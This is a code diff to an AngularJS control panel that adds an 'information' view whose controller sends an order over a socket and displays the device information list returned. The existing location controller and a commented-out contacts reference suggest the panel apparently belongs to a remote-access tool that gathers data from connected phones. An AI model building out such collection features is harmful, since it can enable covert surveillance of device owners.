@@ -45,6 +45,10 @@ app.config(function($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+		.when("/information", {
+            templateUrl: "./views/information.html",
+            controller: "InfoCtrl"
         });
 });
 
@@ -590,4 +594,70 @@ app.controller("LocCtrl", function($scope, $rootScope) {
 
     });
 
+});
+
+//-----------------------Information Controller (information.htm)------------------------
+// Information controller
+app.controller("InfoCtrl", function($scope, $rootScope){
+	/*$InfoCtrl = $scope;
+    var information = CONSTANTS.orders.information;
+
+    $InfoCtrl.$on('$destroy', () => {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(information);
+    });
+
+    $InfoCtrl.Refresh = () => {
+
+        $InfoCtrl.load = 'loading';
+        $rootScope.Log('Get Info..');
+        socket.emit(ORDER, { order: information });
+
+    }
+
+    $InfoCtrl.barLimit = 50;
+    $InfoCtrl.increaseLimit = () => {
+        $InfoCtrl.barLimit += 50;
+    }
+
+    socket.on(information, (data) => {
+        $InfoCtrl.load = '';
+        if (data.infoList) {
+            $InfoCtrl.load = '';
+            $rootScope.Log('Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
+            $InfoCtrl.infoList = data.infoList;
+            $InfoCtrl.contactsSize = data.contactsList.length;
+            $InfoCtrl.$apply();
+        }
+
+    });*/
+    $InfoCtrl = $scope;
+    $InfoCtrl.infoList = [];
+    var informations = CONSTANTS.orders.informations;
+
+    $InfoCtrl.$on('$destroy', () => {
+        // release resources, cancel Listner...
+        socket.removeAllListeners(informations);
+    });
+
+    $InfoCtrl.load = 'loading';
+    $rootScope.Log('Get Info list..');
+    socket.emit(ORDER, { order: informations });
+
+    $InfoCtrl.barLimit = 50;
+    $InfoCtrl.increaseLimit = () => {
+        $InfoCtrl.barLimit += 50;
+    }
+
+    $rootScope.Log('socketON', 'before');
+    socket.on(informations, (data) => {
+        $rootScope.Log('socketON', CONSTANTS.logStatus.SUCCESS);
+        if (data.infoList) {
+            $InfoCtrl.load = '';
+            $rootScope.Log('Info list arrived', CONSTANTS.logStatus.SUCCESS);
+            $InfoCtrl.infoList = data.infoList;
+            $InfoCtrl.contactsSize = data.infoList.length;
+            $InfoCtrl.$apply();
+        }
+    });
 });
